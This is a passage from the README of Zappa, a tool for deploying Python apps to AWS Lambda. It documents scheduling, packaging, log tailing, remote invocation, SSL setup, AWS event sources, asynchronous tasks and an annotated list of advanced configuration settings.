`unschedule` command:\n\n    $ zappa unschedule production\n\nAnd now your scheduled event rules are deleted.\n\nSee the [example](example\/) for more details.\n\n#### Advanced Scheduling\n\nSometimes a function needs multiple expressions to describe its schedule. To set multiple expressions, simply list your functions, and the list of expressions to schedule them using [cron or rate syntax](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/tutorial-scheduled-events-schedule-expressions.html) in your *zappa_settings.json* file:\n\n```javascript\n{\n    \"production\": {\n       ...\n       \"events\": [{\n           \"function\": \"your_module.your_function\", \/\/ The function to execute\n           \"expressions\": [\"cron(0 20-23 ? * SUN-THU *)\", \"cron(0 0-8 ? * MON-FRI *)\"] \/\/ When to execute it (in cron or rate format)\n       }],\n       ...\n    }\n}\n```\n\nThis can be used to deal with issues arising from the UTC timezone crossing midnight during business hours in your local timezone.\n\nIt should be noted that overlapping expressions will not throw a warning, and should be checked for, to prevent duplicate triggering of functions.\n\n### Undeploy\n\nIf you need to remove the API Gateway and Lambda function that you have previously published, you can simply:\n\n    $ zappa undeploy production\n\nYou will be asked for confirmation before it executes.\n\nIf you enabled CloudWatch Logs for your API Gateway service and you don't\nwant to keep those logs, you can specify the `--remove-logs` argument to purge the logs for your API Gateway and your Lambda function:\n\n    $ zappa undeploy production --remove-logs\n\n### Package\n\nIf you want to build your application package without actually uploading and registering it as a Lambda function, you can use the `package` command:\n\n    $ zappa package production\n\nIf you have a `zip` callback in your `callbacks` setting, this will also be invoked.\n\n```javascript\n{\n    \"production\": { \/\/ The name of your stage\n        \"callbacks\": {\n            \"zip\": \"my_app.zip_callback\"\/\/ After creating the package\n        }\n    }\n}\n```\n\nYou can also specify the output filename of the package with `-o`:\n\n    $ zappa package production -o my_awesome_package.zip\n\n#### How Zappa Makes Packages\n\nZappa will automatically package your active virtual environment into a package which runs smoothly on AWS Lambda.\n\nDuring this process, it will replace any local dependencies with AWS Lambda compatible versions. Dependencies are included in this order:\n\n  * Lambda-compatible `manylinux` wheels from a local cache\n  * Lambda-compatible `manylinux` wheels from PyPI\n  * Lambda-specific versions from [lambda-package](https:\/\/github.com\/Miserlou\/lambda-packages)\n  * Packages from the active virtual environment\n  * Packages from the local project directory\n\nIt also skips certain unnecessary files, and ignores any .py files if .pyc files are available.\n\nIn addition, Zappa will also automatically set the correct execution permissions, configure package settings, and create a unique, auditable package manifest file.\n\nTo further reduce the final package file size, you can:\n\n* Set `slim_handler` to `True` to upload a small handler to Lambda and the rest of the package to S3. For more details, see the [merged pull request](https:\/\/github.com\/Miserlou\/Zappa\/pull\/548) and the [discussion in the original issue](https:\/\/github.com\/Miserlou\/Zappa\/issues\/510). See also: [Large Projects](#large-projects).\n* Use the `exclude` setting and provide a list of regex patterns to exclude from the archive. By default, Zappa will exclude Boto, because [it's already available in the Lambda execution environment](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/current-supported-versions.html).\n\n### Template\n\nSimilarly to `package`, if you only want the API Gateway CloudFormation template, use the `template` command:\n\n    $ zappa template production --l your-lambda-arn -r your-role-arn\n\nNote that you must supply your own Lambda ARN and Role ARNs in this case, as they may not have been created for you.\n\nYou can get the JSON output directly with `--json`, and specify the output file with `--output`.\n\n### Status\n\nIf you need to see the status of your deployment and event schedules, simply use the `status` command.\n\n    $ zappa status production\n\n### Tailing Logs\n\nYou can watch the logs of a deployment by calling the `tail` management command.\n\n    $ zappa tail production\n\nBy default, this will show all log items. In addition to HTTP and other events, anything `print`ed to `stdout` or `stderr` will be shown in the logs.\n\nYou can use the argument `--http` to filter for HTTP requests, which will be in the Apache Common Log Format.\n\n    $ zappa tail production --http\n\nSimilarly, you can do the inverse and only show non-HTTP events and log messages:\n\n    $ zappa tail production --non-http\n\nIf you don't like the default log colors, you can turn them off with `--no-color`.\n\nYou can also limit the length of the tail with `--since`, which accepts a simple duration string:\n\n    $ zappa tail production --since 4h # 4 hours\n    $ zappa tail production --since 1m # 1 minute\n    $ zappa tail production --since 1mm # 1 month\n\nYou can filter out the contents of the logs with `--filter`, like so:\n\n    $ zappa tail production --http --filter \"POST\" # Only show POST HTTP requests\n\nNote that this uses the [CloudWatch Logs filter syntax](http:\/\/docs.aws.amazon.com\/AmazonCloudWatch\/latest\/logs\/FilterAndPatternSyntax.html).\n\nTo tail logs without following (to exit immediately after displaying the end of the requested logs), pass `--disable-keep-open`:\n\n    $ zappa tail production --since 1h --disable-keep-open\n\n\n### Remote Function Invocation\n\nYou can execute any function in your application directly at any time by using the `invoke` command.\n\nFor instance, suppose you have a basic application in a file called \"my_app.py\", and you want to invoke a function in it called \"my_function\". Once your application is deployed, you can invoke that function at any time by calling:\n\n    $ zappa invoke production 'my_app.my_function'\n\nAny remote print statements made and the value the function returned will then be printed to your local console. **Nifty!**\n\nYou can also invoke interpretable Python 2.7 or Python 3.6 strings directly by using `--raw`, like so:\n\n    $ zappa invoke production \"print 1 + 2 + 3\" --raw\n\nFor instance, it can come in handy if you want to create your first `superuser` on a RDS database running in a VPC (like Serverless Aurora):\n    $ zappa invoke staging \"from django.contrib.auth import get_user_model; User = get_user_model(); User.objects.create_superuser('username', 'email', 'password')\" --raw\n\n### Django Management Commands\n\nAs a convenience, Zappa can also invoke remote Django 'manage.py' commands with the `manage` command. For instance, to perform the basic Django status check:\n\n    $ zappa manage production showmigrations admin\n\nObviously, this only works for Django projects which have their settings properly defined.\n\nFor commands which have their own arguments, you can also pass the command in as a string, like so:\n\n    $ zappa manage production \"shell --version\"\n\nCommands which require direct user input, such as `createsuperuser`, should be [replaced by commands](http:\/\/stackoverflow.com\/a\/26091252) which use `zappa invoke <env> --raw`.\n\nFor more Django integration, take a look at the [zappa-django-utils](https:\/\/github.com\/Miserlou\/zappa-django-utils) project.\n\n_(Please note that commands which take over 30 seconds to execute may time-out preventing output from being returned - but the command may continue to run. See [this related issue](https:\/\/github.com\/Miserlou\/Zappa\/issues\/205#issuecomment-236391248) for a work-around.)_\n\n### SSL Certification\n\nZappa can be deployed to custom domain names and subdomains with custom SSL certificates, Let's Encrypt certificates, and [AWS Certificate Manager](https:\/\/aws.amazon.com\/certificate-manager\/) (ACM) certificates.\n\nCurrently, the easiest of these to use are the AWS Certificate Manager certificates, as they are free, self-renewing, and require the least amount of work.\n\nOnce configured as described below, all of these methods use the same command:\n\n    $ zappa certify\n\nWhen deploying from a CI\/CD system, you can use:\n\n    $ zappa certify --yes\n\nto skip the confirmation prompt.\n\n#### Deploying to a Domain With AWS Certificate Manager\n\nAmazon provides their own free alternative to Let's Encrypt called [AWS Certificate Manager](https:\/\/aws.amazon.com\/certificate-manager\/) (ACM). To use this service with Zappa:\n\n1. Verify your domain in the AWS Certificate Manager console.\n2. In the console, select the N. Virginia (us-east-1) region and request a certificate for your domain or subdomain (`sub.yourdomain.tld`), or request a wildcard domain (`*.yourdomain.tld`).\n3. Copy the entire ARN of that certificate and place it in the Zappa setting `certificate_arn`.\n4. Set your desired domain in the `domain` setting.\n5. Call `$ zappa certify` to create and associate the API Gateway distribution using that certificate.\n\n#### Deploying to a Domain With a Let's Encrypt Certificate (DNS Auth)\n\nIf you want to use Zappa on a domain with a free Let's Encrypt certificate using automatic Route 53 based DNS Authentication, you can follow [this handy guide](https:\/\/github.com\/Miserlou\/Zappa\/blob\/master\/docs\/domain_with_free_ssl_dns.md).\n\n#### Deploying to a Domain With a Let's Encrypt Certificate (HTTP Auth)\n\nIf you want to use Zappa on a domain with a free Let's Encrypt certificate using HTTP Authentication, you can follow [this guide](https:\/\/github.com\/Miserlou\/Zappa\/blob\/master\/docs\/domain_with_free_ssl_http.md).\n\nHowever, it's now far easier to use Route 53-based DNS authentication, which will allow you to use a Let's Encrypt certificate with a single `$ zappa certify` command.\n\n#### Deploying to a Domain With Your Own SSL Certs\n\n1. The first step is to create a custom domain and obtain your SSL cert \/ key \/ bundle.\n2. Ensure you have set the `domain` setting within your Zappa settings JSON - this will avoid problems with the Base Path mapping between the Custom Domain and the API invoke URL, which gets the Stage Name appended in the URI\n3. Add the paths to your SSL cert \/ key \/ bundle to the `certificate`, `certificate_key`, and `certificate_chain` settings, respectively, in your Zappa settings JSON\n4. Set `route53_enabled` to `false` if you plan on using your own DNS provider, and not an AWS Route53 Hosted zone.\n5. Deploy or update your app using Zappa\n6. Run `$ zappa certify` to upload your certificates and register the custom domain name with your API gateway.\n\n## Executing in Response to AWS Events\n\nSimilarly, you can have your functions execute in response to events that happen in the AWS ecosystem, such as S3 uploads, DynamoDB entries, Kinesis streams, SNS messages, and SQS queues.\n\nIn your *zappa_settings.json* file, define your [event sources](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/invoking-lambda-function.html) and the function you wish to execute. For instance, this will execute `your_module.process_upload_function` in response to new objects in your `my-bucket` S3 bucket. Note that `process_upload_function` must accept `event` and `context` parameters.\n\n```javascript\n{\n    \"production\": {\n       ...\n       \"events\": [{\n            \"function\": \"your_module.process_upload_function\",\n            \"event_source\": {\n                  \"arn\":  \"arn:aws:s3:::my-bucket\",\n                  \"events\": [\n                    \"s3:ObjectCreated:*\" \/\/ Supported event types: http:\/\/docs.aws.amazon.com\/AmazonS3\/latest\/dev\/NotificationHowTo.html#supported-notification-event-types\n                  ]\n               }\n            }],\n       ...\n    }\n}\n```\n\nAnd then:\n\n    $ zappa schedule production\n\nAnd now your function will execute every time a new upload appears in your bucket!\n\nTo access the key's information in your application context, you'll want `process_upload_function` to look something like this:\n\n```python\nimport boto3\ns3_client = boto3.client('s3')\n\ndef process_upload_function(event, context):\n    \"\"\"\n    Process a file upload.\n    \"\"\"\n\n    # Get the uploaded file's information\n    bucket = event['Records'][0]['s3']['bucket']['name'] # Will be `my-bucket`\n    key = event['Records'][0]['s3']['object']['key'] # Will be the file path of whatever file was uploaded.\n\n    # Get the bytes from S3\n    s3_client.download_file(bucket, key, '\/tmp\/' + key) # Download this file to writable tmp space.\n    file_bytes = open('\/tmp\/' + key).read()\n```\n\nSimilarly, for a [Simple Notification Service](https:\/\/aws.amazon.com\/sns\/) event:\n\n```javascript\n        \"events\": [\n            {\n                \"function\": \"your_module.your_function\",\n                \"event_source\": {\n                    \"arn\":  \"arn:aws:sns:::your-event-topic-arn\",\n                    \"events\": [\n                        \"sns:Publish\"\n                    ]\n                }\n            }\n        ]\n```\n\nOptionally you can add [SNS message filters](http:\/\/docs.aws.amazon.com\/sns\/latest\/dg\/message-filtering.html):\n\n```javascript\n        \"events\": [\n            {\n                \"function\": \"your_module.your_function\",\n                \"event_source\": {\n                    \"arn\":  \"arn:aws:sns:::your-event-topic-arn\",\n                    \"filters\": {\n                        \"interests\": [\"python\", \"aws\", \"zappa\"],\n                        \"version\": [\"1.0\"]\n                    },\n                    ...\n                }\n            }\n        ]\n```\n\n[DynamoDB](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/with-ddb.html) and [Kinesis](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/with-kinesis.html) are slightly different as it is not event based but pulling from a stream:\n\n```javascript\n       \"events\": [\n           {\n               \"function\": \"replication.replicate_records\",\n               \"event_source\": {\n                    \"arn\":  \"arn:aws:dynamodb:us-east-1:1234554:table\/YourTable\/stream\/2016-05-11T00:00:00.000\",\n                    \"starting_position\": \"TRIM_HORIZON\", \/\/ Supported values: TRIM_HORIZON, LATEST\n                    \"batch_size\": 50, \/\/ Max: 1000\n                    \"enabled\": true \/\/ Default is false\n               }\n           }\n       ]\n```\n\n[SQS](https:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/with-sqs.html) is also pulling messages from a stream.  At this time, [only \"Standard\" queues can trigger lambda events, not \"FIFO\" queues](https:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/with-sqs.html).  Read the AWS Documentation carefully since Lambda calls the SQS DeleteMessage API on your behalf once your function completes successfully.\n\n```javascript\n       \"events\": [\n           {\n               \"function\": \"your_module.process_messages\",\n               \"event_source\": {\n                    \"arn\":  \"arn:aws:sqs:us-east-1:12341234:your-queue-name-arn\",\n                    \"batch_size\": 10, \/\/ Max: 10. Use 1 to trigger immediate processing\n                    \"enabled\": true \/\/ Default is false\n               }\n           }\n       ]\n```\n\nFor configuring Lex Bot's intent triggered events:\n```javascript\n    \"bot_events\": [\n        {\n            \"function\": \"lexbot.handlers.book_appointment.handler\",\n            \"event_source\": {\n                \"arn\": \"arn:aws:lex:us-east-1:01234123123:intent:TestLexEventNames:$LATEST\", \/\/ optional. In future it will be used to configure the intent\n                \"intent\":\"intentName\", \/\/ name of the bot event configured\n                \"invocation_source\":\"DialogCodeHook\", \/\/ either FulfillmentCodeHook or DialogCodeHook\n            }\n        }\n    ]\n\n```\n\nEvents can also take keyword arguments:\n```javascript\n       \"events\": [\n            {\n                \"function\": \"your_module.your_recurring_function\", \/\/ The function to execute\n                \"kwargs\": {\"key\": \"val\", \"key2\": \"val2\"},  \/\/ Keyword arguments to pass. These are available in the event\n                \"expression\": \"rate(1 minute)\" \/\/ When to execute it (in cron or rate format)\n            }\n       ]\n```\n\nTo get the keyword arguments you will need to look inside the event dictionary:\n\n```python\ndef your_recurring_function(event, context):\n    my_kwargs = event.get(\"kwargs\")  # dict of kwargs given in zappa_settings file\n\n```\n\n\nYou can find more [example event sources here](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/eventsources.html).\n\n## Asynchronous Task Execution\n\nZappa also now offers the ability to seamlessly execute functions asynchronously in a completely separate AWS Lambda instance!\n\nFor example, if you have a Flask API for ordering a pie, you can call your `bake` function seamlessly in a completely separate Lambda instance by using the `zappa.asynchronous.task` decorator like so:\n\n```python\nfrom flask import Flask\nfrom zappa.asynchronous import task\napp = Flask(__name__)\n\n@task\ndef make_pie():\n    \"\"\" This takes a long time! \"\"\"\n    ingredients = get_ingredients()\n    pie = bake(ingredients)\n    deliver(pie)\n\n@app.route('\/api\/order\/pie')\ndef order_pie():\n    \"\"\" This returns immediately! \"\"\"\n    make_pie()\n    return \"Your pie is being made!\"\n\n```\n\nAnd that's it! Your API response will return immediately, while the `make_pie` function executes in a completely different Lambda instance.\n\nWhen calls to @task decorated functions or the zappa.asynchronous.run command occur outside of Lambda, such as your local dev environment,\nthe functions will execute immediately and locally. The zappa asynchronous functionality only works\nwhen in the Lambda environment or when specifying [Remote Invocations](https:\/\/github.com\/Miserlou\/zappa#remote-invocations).\n\n### Catching Exceptions\nPutting a try..except block on an asynchronous task like this:\n\n```python\n@task\ndef make_pie():\n    try:\n        ingredients = get_ingredients()\n        pie = bake(ingredients)\n        deliver(pie)\n    except Fault as error:\n        \"\"\"send an email\"\"\"\n    ...\n    return Response('Web services down', status=503)\n```\n\nwill cause an email to be sent twice for the same error. See [asynchronous retries at AWS](https:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/retries-on-errors.html). To work around this side-effect, and have the fault handler execute only once, change the return value to:\n\n```python\n@task\ndef make_pie():\n    try:\n        \"\"\"code block\"\"\"\n    except Fault as error:\n        \"\"\"send an email\"\"\"\n    ...\n    return {} #or return True\n```\n\n### Task Sources\n\nBy default, this feature uses direct AWS Lambda invocation. You can instead use AWS Simple Notification Service as the task event source by using the `task_sns` decorator, like so:\n\n```python\nfrom zappa.asynchronous import task_sns\n@task_sns\n```\n\nUsing SNS also requires setting the following settings in your `zappa_settings`:\n\n```javascript\n{\n  \"dev\": {\n    ..\n      \"async_source\": \"sns\", \/\/ Source of async tasks. Defaults to \"lambda\"\n      \"async_resources\": true, \/\/ Create the SNS topic to use. Defaults to true.\n    ..\n    }\n}\n```\n\nThis will automatically create and subscribe to the SNS topic the code will use when you call the `zappa schedule` command.\n\nUsing SNS will also return a message ID in case you need to track your invocations.\n\n### Direct Invocation\n\nYou can also use this functionality without a decorator by passing your function to `zappa.asynchronous.run`, like so:\n\n```python\nfrom zappa.asynchronous import run\n\nrun(your_function, args, kwargs) # Using Lambda\nrun(your_function, args, kwargs, service='sns') # Using SNS\n```\n\n### Remote Invocations\n\nBy default, Zappa will use lambda's current function name and current AWS region. If you wish to invoke a lambda with\n  a different function name\/region or invoke your lambda from outside of lambda, you must specify the\n  `remote_aws_lambda_function_name` and `remote_aws_region` arguments so that the application knows which function and\n  region to use. For example, if some part of our pizza making application had to live on an EC2 instance, but we\n  wished to call the make_pie() function on its own Lambda instance, we would do it as follows:\n\n ```python\n@task(remote_aws_lambda_function_name='pizza-pie-prod', remote_aws_region='us-east-1')\ndef make_pie():\n    \"\"\" This takes a long time! \"\"\"\n    ingredients = get_ingredients()\n    pie = bake(ingredients)\n    deliver(pie)\n\n```\nIf those task() parameters were not used, then EC2 would execute the function locally. These same\n `remote_aws_lambda_function_name` and `remote_aws_region` arguments can be used on the zappa.asynchronous.run() function as well.\n\n### Restrictions\n\nThe following restrictions to this feature apply:\n\n* Functions must have a clean import path -- i.e. no closures, lambdas, or methods.\n* `args` and `kwargs` must be JSON-serializable.\n* The JSON-serialized arguments must be within the size limits for Lambda (256K) or SNS (256K) events.\n\nAll of this code is still backwards-compatible with non-Lambda environments - it simply executes in a blocking fashion and returns the result.\n\n### Running Tasks in a VPC\n\nIf you're running Zappa in a Virtual Private Cloud (VPC), you'll need to configure your subnets to allow your lambda to communicate with services inside your VPC as well as the public Internet. A minimal setup requires two subnets.\n\nIn __subnet-a__:\n* Create a NAT\n* Create an Internet gateway\n* In the route table, create a route pointing the Internet gateway to 0.0.0.0\/0.\n\nIn __subnet-b__:\n* Place your lambda function\n* In the route table, create a route pointing the NAT that belongs to __subnet-a__ to 0.0.0.0\/0.\n\nYou can place your lambda in multiple subnets that are configured the same way as __subnet-b__ for high availability.\n\nSome helpful resources are [this tutorial](http:\/\/docs.aws.amazon.com\/AmazonRDS\/latest\/UserGuide\/CHAP_Tutorials.WebServerDB.CreateVPC.html), [this other tutorial](https:\/\/gist.github.com\/reggi\/dc5f2620b7b4f515e68e46255ac042a7) and [this AWS doc page](http:\/\/docs.aws.amazon.com\/lambda\/latest\/dg\/vpc.html#vpc-internet).\n\n### Responses\n\nIt is possible to capture the responses of Asynchronous tasks.\n\nZappa uses DynamoDB as the backend for these.\n\nTo capture responses, you must configure a `async_response_table` in `zappa_settings`. This is the DynamoDB table name. Then, when decorating with `@task`, pass `capture_response=True`.\n\nAsync responses are assigned a `response_id`. This is returned as a property of the `LambdaAsyncResponse` (or `SnsAsyncResponse`) object that is returned by the `@task` decorator.\n\nExample:\n\n```python\nfrom zappa.asynchronous import task, get_async_response\nfrom flask import Flask, make_response, abort, url_for, redirect, request, jsonify\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('\/payload')\ndef payload():\n    delay = request.args.get('delay', 60)\n    x = longrunner(delay)\n    return redirect(url_for('response', response_id=x.response_id))\n\n@app.route('\/async-response\/<response_id>')\ndef response(response_id):\n    response = get_async_response(response_id)\n    if response is None:\n        abort(404)\n\n    if response['status'] == 'complete':\n        return jsonify(response['response'])\n\n    sleep(5)\n\n    return \"Not yet ready. Redirecting.\", 302, {\n        'Content-Type': 'text\/plain; charset=utf-8',\n        'Location': url_for('response', response_id=response_id, backoff=5),\n        'X-redirect-reason': \"Not yet ready.\",\n    }\n\n@task(capture_response=True)\ndef longrunner(delay):\n    sleep(float(delay))\n    return {'MESSAGE': \"It took {} seconds to generate this.\".format(delay)}\n\n```\n\n## Advanced Settings\n\nThere are other settings that you can define in your local settings\nto change Zappa's behavior. Use these at your own risk!\n\n```javascript\n {\n    \"dev\": {\n        \"alb_enabled\": false, \/\/ enable provisioning of application load balancing resources. If set to true, you _must_ fill out the alb_vpc_config option as well.\n        \"alb_vpc_config\": {\n            \"CertificateArn\": \"your_acm_certificate_arn\", \/\/ ACM certificate ARN for ALB\n            \"SubnetIds\": [], \/\/ list of subnets for ALB\n            \"SecurityGroupIds\": [] \/\/ list of security groups for ALB\n        },\n        \"api_key_required\": false, \/\/ enable securing API Gateway endpoints with x-api-key header (default False)\n        \"api_key\": \"your_api_key_id\", \/\/ optional, use an existing API key. The option \"api_key_required\" must be true to apply\n        \"apigateway_enabled\": true, \/\/ Set to false if you don't want to create an API Gateway resource. Default true.\n        \"apigateway_description\": \"My funky application!\", \/\/ Define a custom description for the API Gateway console. Default None.\n        \"assume_policy\": \"my_assume_policy.json\", \/\/ optional, IAM assume policy JSON file\n        \"attach_policy\": \"my_attach_policy.json\", \/\/ optional, IAM attach policy JSON file\n        \"apigateway_policy\": \"my_apigateway_policy.json\", \/\/ optional, API Gateway resource policy JSON file\n        \"async_source\": \"sns\", \/\/ Source of async tasks. Defaults to \"lambda\"\n        \"async_resources\": true, \/\/ Create the SNS topic and DynamoDB table to use. Defaults to true.\n        \"async_response_table\": \"your_dynamodb_table_name\",  \/\/ the DynamoDB table name to use for captured async responses; defaults to None (can't capture)\n        \"async_response_table_read_capacity\": 1,  \/\/ DynamoDB table read capacity; defaults to 1\n        \"async_response_table_write_capacity\": 1,  \/\/ DynamoDB table write capacity; defaults to 1\n        \"aws_endpoint_urls\": { \"aws_service_name\": \"endpoint_url\" }, \/\/ a dictionary of endpoint_urls that emulate the appropriate service.  Usually used for testing, for instance with `localstack`.\n        \"aws_environment_variables\" : {\"your_key\": \"your_value\"}, \/\/ A dictionary of environment variables that will be available to your deployed app via AWS Lambdas native environment variables. See also \"environment_variables\" and \"remote_env\" . Default {}.\n        \"aws_kms_key_arn\": \"your_aws_kms_key_arn\", \/\/ Your AWS KMS Key ARN\n        \"aws_region\": \"aws-region-name\", \/\/ optional, uses region set in profile or environment variables if not set here,\n        \"binary_support\": true, \/\/ Enable automatic MIME-type based response encoding through API Gateway. Default true.\n        \"callbacks\": { \/\/ Call custom functions during the local Zappa deployment\/update process\n            \"settings\": \"my_app.settings_callback\", \/\/ After loading the settings\n            \"zip\": \"my_app.zip_callback\", \/\/ After creating the package\n            \"post\": \"my_app.post_callback\", \/\/ After command has executed\n        },\n        \"cache_cluster_enabled\": false, \/\/ Use APIGW cache cluster (default False)\n        \"cache_cluster_size\": 0.5, \/\/ APIGW Cache Cluster size (default 0.5)\n        \"cache_cluster_ttl\": 300, \/\/ APIGW Cache Cluster time-to-live (default 300)\n        \"cache_cluster_encrypted\": false, \/\/ Whether or not APIGW Cache Cluster encrypts data (default False)\n        \"certificate\": \"my_cert.crt\", \/\/ SSL certificate file location. Used to manually certify a custom domain\n        \"certificate_key\": \"my_key.key\", \/\/ SSL key file location. Used to manually certify a custom domain\n        \"certificate_chain\": \"my_cert_chain.pem\", \/\/ SSL certificate chain file location. Used to manually certify a custom domain\n        \"certificate_arn\": \"arn:aws:acm:us-east-1:1234512345:certificate\/aaaa-bbb-cccc-dddd\", \/\/ ACM certificate ARN (needs to be in us-east-1 region).\n        \"cloudwatch_log_level\": \"OFF\", \/\/ Enables\/configures a level of logging for the given staging. Available options: \"OFF\", \"INFO\", \"ERROR\", default \"OFF\".\n        \"cloudwatch_data_trace\": false, \/\/ Logs all data about received events. Default false.\n        \"cloudwatch_metrics_enabled\": false, \/\/ Additional metrics for the API Gateway. Default false.\n        \"cognito\": { \/\/ for Cognito event triggers\n            \"user_pool\": \"user-pool-id\", \/\/ User pool ID from AWS Cognito\n            \"triggers\": [{\n                \"source\": \"PreSignUp_SignUp\", \/\/ triggerSource from http:\/\/docs.aws.amazon.com\/cognito\/latest\/developerguide\/cognito-user-identity-pools-working-with-aws-lambda-triggers.html#cognito-user-pools-lambda-trigger-syntax-pre-signup\n                \"function\": \"my_app.pre_signup_function\"\n            }]\n        },\n        \"context_header_mappings\": { \"HTTP_header_name\": \"API_Gateway_context_variable\" }, \/\/ A dictionary mapping HTTP header names to API Gateway context variables\n        \"cors\": false, \/\/ Enable Cross-Origin Resource Sharing. Default false. If true, simulates the \"Enable CORS\" button on the API Gateway console. Can also be a dictionary specifying lists of \"allowed_headers\", \"allowed_methods\", and string of \"allowed_origin\"\n        \"dead_letter_arn\": \"arn:aws:<sns\/sqs>:::my-topic\/queue\", \/\/ Optional Dead Letter configuration for when Lambda async invoke fails thrice\n        \"debug\": true, \/\/ Print Zappa configuration errors tracebacks in the 500. Default true.\n        \"delete_local_zip\": true, \/\/ Delete the local zip archive after code updates. Default true.\n        \"delete_s3_zip\": true, \/\/ Delete the s3 zip archive. Default true.\n        \"django_settings\": \"your_project.production_settings\", \/\/ The modular path to your Django project's settings. For Django projects only.\n        \"domain\": \"yourapp.yourdomain.com\", \/\/ Required if you're using a domain\n        \"base_path\": \"your-base-path\", \/\/ Optional base path for API gateway custom domain base path mapping. Default None. Not supported for use with Application Load Balancer event sources.\n        \"environment_variables\": {\"your_key\": \"your_value\"}, \/\/ A dictionary of environment variables that will be available to your deployed app. See also \"remote_env\" and \"aws_environment_variables\". Default {}.\n        \"events\": [\n            {   \/\/ Recurring events\n                \"function\": \"your_module.your_recurring_function\", \/\/ The function to execute\n                \"expression\": \"rate(1 minute)\" \/\/ When to execute it (in cron or rate format)\n            },\n            {   \/\/ AWS Reactive events\n                \"function\": \"your_module.your_reactive_function\", \/\/ The function to execute\n                \"event_source\": {\n                    \"arn\":  \"arn:aws:s3:::my-bucket\", \/\/ The ARN of this event source\n                    \"events\": [\n                        \"s3:ObjectCreated:*\" \/\/ The specific event to execute in response to.\n                    ]\n                }\n            }\n        ],\n        \"endpoint_configuration\": [\"EDGE\", \"REGIONAL\", \"PRIVATE\"],  \/\/ Specify APIGateway endpoint None (default) or list `EDGE`, `REGION`, `PRIVATE`\n        \"exception_handler\": \"your_module.report_exception\", \/\/ function that will be invoked in case Zappa sees an unhandled exception raised from your code\n        \"exclude\": [\"*.gz\", \"*.rar\"], \/\/ A list of regex patterns to exclude from the archive. To exclude boto3 and botocore (available in an older version on Lambda), add \"boto3*\" and \"botocore*\".\n        \"extends\": \"stage_name\", \/\/ Duplicate and extend another stage's settings. For example, `dev-asia` could extend from `dev-common` with a different `s3_bucket` value.\n        \"extra_permissions\": [{ \/\/ Attach any extra permissions to this policy. Default None\n            \"Effect\": \"Allow\",\n            \"Action\": [\"rekognition:*\"], \/\/ AWS Service ARN\n            \"Resource\": \"*\"\n        }],\n        \"iam_authorization\": false, \/\/ optional, use IAM to require request signing. Default false. Note that enabling this will override the authorizer configuration.\n        \"include\": [\"your_special_library_to_load_at_handler_init\"], \/\/ load special libraries into PYTHONPATH at handler init that certain modules cannot find on path\n        \"authorizer\": {\n            \"function\": \"your_module.your_auth_function\", \/\/ Local function to run for token validation. For more information about the function see below.\n            \"arn\": \"arn:aws:lambda:<region>:<account_id>:function:<function_name>\", \/\/ Existing Lambda function to run for token validation.\n            \"result_ttl\": 300, \/\/ Optional. Default 300. The time-to-live (TTL) period, in seconds, that specifies how long API Gateway caches authorizer results. Currently, the maximum TTL value is 3600 seconds.\n            \"token_header\": \"Authorization\", \/\/ Optional. Default 'Authorization'. The name of a custom authorization header containing the token that clients submit as part of their requests.\n            \"validation_expression\": \"^Bearer \\\\w+$\", \/\/ Optional. A validation expression for the incoming token, specify a regular expression.\n        },\n        \"keep_warm\": true, \/\/ Create CloudWatch events to keep the server warm. Default true. To remove, set to false and then `unschedule`.\n        \"keep_warm_expression\": \"rate(4 minutes)\", \/\/ How often to execute the keep-warm, in cron and rate format. Default 4 minutes.\n        \"lambda_description\": \"Your Description\", \/\/ However you want to describe your project for the AWS console. Default \"Zappa Deployment\".\n        \"lambda_handler\": \"your_custom_handler\", \/\/ The name of Lambda handler. Default: handler.lambda_handler\n        \"lets_encrypt_key\": \"s3:\/\/your-bucket\/account.key\", \/\/ Let's Encrypt account key path. Can either be an S3 path or a local file path.\n        \"log_level\": \"DEBUG\", \/\/ Set the Zappa log level. Can be one of CRITICAL, ERROR, WARNING, INFO and DEBUG. Default: DEBUG\n        \"manage_roles\": true, \/\/ Have Zappa automatically create and define IAM execution roles and policies. Default true. If false, you must define your own IAM Role and role_name setting.\n        \"memory_size\": 512, \/\/ Lambda function memory in MB. Default 512.\n        \"num_retained_versions\":null, \/\/ Indicates the number of old versions to retain for the lambda. If absent, keeps all the versions of the function.\n        \"payload_compression\": true, \/\/ Whether or not to enable API gateway payload compression (default: true)\n        \"payload_minimum_compression_size\": 0, \/\/ The threshold size (in bytes) below which payload compression will not be applied (default: 0)\n        \"prebuild_script\": \"your_module.your_function\", \/\/ Function to execute before uploading code\n        \"profile_name\": \"your-profile-name\", \/\/ AWS profile credentials to use. Default 'default'. Removing this setting will use the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variables instead.\n        \"project_name\": \"MyProject\", \/\/ The name of the project as it appears on AWS. Defaults to a slugified `pwd`.\n        \"remote_env\": \"s3:\/\/my-project-config-files\/filename.json\", \/\/ optional file in s3 bucket containing a flat json object which will be used to set custom environment variables.\n        \"role_name\": \"MyLambdaRole\", \/\/ Name of Zappa execution role. Default <project_name>-<env>-ZappaExecutionRole. To use a different, pre-existing policy, you must also set manage_roles to false.\n        \"role_arn\": \"arn:aws:iam::12345:role\/app-ZappaLambdaExecutionRole\", \/\/ ARN of Zappa execution role. Default to None. To use a different, pre-existing policy, you must also set manage_roles to false. This overrides role_name. Use with temporary credentials via GetFederationToken.\n        \"route53_enabled\": true, \/\/ Have Zappa update your Route53 Hosted Zones when certifying with a custom domain. Default true.\n        \"runtime\": \"python2.7\", \/\/ Python runtime to use on Lambda. Can be one of \"python2.7\", \"python3.6\" or \"python3.7\". Defaults to whatever the current Python being used is.\n        \"s3_bucket\": \"dev-bucket\", \/\/ Zappa zip bucket,\n        \"slim_handler\": false, \/\/ Useful if project >50M. Set true to just upload a small handler to Lambda and load actual project from S3 at runtime. Default false.\n        \"settings_file\": \"~\/Projects\/MyApp\/settings\/dev_settings.py\", \/\/ Server side settings file location,\n        \"tags\": { \/\/ Attach additional tags to AWS Resources\n            \"Key\": \"Value\",  \/\/ Example Key and value\n            \"Key2\": \"Value2\",\n            },\n        \"timeout_seconds\": 30, 